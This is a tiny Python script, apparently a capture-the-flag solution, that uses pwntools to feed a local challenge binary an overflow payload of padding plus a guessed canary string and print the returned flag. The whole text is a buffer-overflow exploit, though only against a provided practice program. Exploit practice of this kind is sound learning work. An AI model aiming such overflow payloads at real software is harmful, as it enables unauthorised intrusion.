from pwn import *

p = process('./provided')

p.sendline(b'A'*73+b'canary\0'+b'test')
flag = p.recvall()
print(flag.decode())